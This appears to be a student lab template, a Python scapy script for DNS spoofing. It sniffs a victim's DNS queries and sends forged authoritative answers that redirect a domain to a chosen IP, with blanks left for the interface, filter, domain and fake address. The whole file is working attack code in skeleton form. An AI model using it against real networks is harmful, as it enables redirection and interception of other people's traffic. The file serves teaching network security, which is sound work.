from scapy.all import *
import time

# TODO: Fill in the required fields

# 1. This is the IP you are redirecting the victim to. For the sake of marking, make this the Victim's IP
fake_ip = "0.0.0.0"
# 2. This is the domain the victim is trying to resolve, find this using wireshark. Example: facebook.com
query_name = ""


# Do not modify this function
def send_fake_response(packet):
    if packet.haslayer(DNSQR) and packet[DNS].opcode == 0:  # Standard query
        response = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                   UDP(sport=53, dport=packet[UDP].sport) / \
                   DNS(id=packet[DNS].id,
                       qr=1, aa=1, qd=packet[DNSQR],
                       an=DNSRR(rrname=query_name, ttl=300, rdata=fake_ip))
        send(response, verbose=False)
        print(f"Fake response sent for {query_name} -> {fake_ip}")
        quit()


print("Waiting for request\n")

# 3. iface is the interface scapy will use to scan for packets, this is the same interface you are monitoring in Wireshark.
# 4. What protocol and port does our desired packet have? (Hint it is a DNS request). 
#    Answer is of the form "<protocol> port <port number>" so for example "tcp port 80" to scan for HTTP traffic
sniff(iface="", filter="", prn=send_fake_response)